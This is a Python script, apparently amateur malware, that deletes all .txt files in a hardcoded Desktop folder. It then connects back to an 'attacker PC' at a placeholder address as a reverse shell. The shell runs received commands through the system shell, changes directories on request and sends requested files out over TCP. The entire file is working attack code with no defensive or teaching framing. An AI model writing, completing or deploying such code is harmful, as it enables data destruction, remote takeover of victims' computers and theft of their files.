#!/usr/bin/env python

import os #module OS routines for NT or Posix depending on what system we're on, du'h.
import glob #Filename globbing utility.
import requests #Requests is an HTTP library, written in Python, for human beings, I am not human.
import subprocess #this module allows you to spawn processes, connect to their input/output/error pipes, and obtain their return codes.
import time #This module provides various functions to manipulate time values.
import socket #This module provides socket operations and some related functions. On Unix, it supports IP (Internet Protocol) 
              #and Unix domain sockets. On other systems, it only supports IP. Functions specific for a socket are available as methods of the socket object.
 
# get a recursive list of file paths that matches pattern including sub directories
fileList = glob.glob('C:/Users/14405/Desktop/*.txt', recursive=True)#change this for what you need <<<<<<<<<<<<
for filePath in fileList:
    try:
        os.remove(filePath)
    except OSError:
        print("Error while deleting file") 

def connect(): 
    s = socket.socket() #open socket to attacker PC 
    s.connect(('192.168.x.x', 8080)) #attacker PC <<<<<<<<<<<<<<<<
    while True: #create infinite loop
        command = s.recv(1024) #1 kilobyte
        if 'kill' in command.decode(): #terminate command used on attacker PC
            s.close()
            break
        elif 'copy' in command.decode(): #copy file to attacker PC
            copy, path = command.decode().split(' ')#copy command using (space)
            try:
                transfer(s, path) #transfer copied file via TCP to attacker PC
            except Exception as e:
                s.send(str(e).encode())
                pass
        elif 'cd' in command.decode(): #change directory command
            cd, directory = command.decode().split(' ') #change directory using (space)
            try:
                os.chdir(directory) # changing the directory 
                s.send(('[+] Current Directory is ' + os.getcwd()).encode()) # we send back a string mentioning the new Current Directory
            except Exception as e:
                s.send(('[-]  ' + str(e)).encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)#capture output capture error
            s.send(CMD.stdout.read())#standard output
            s.send(CMD.stderr.read())#standard error


def transfer(s, path): #packet transfer
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)#1 kilobyte of data transfer
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())#end of file transfer
        f.close()
    else:
        s.send('Unable to find out the file'.encode()) #file doesn't exist


def main(): #call main function
    connect()

main()


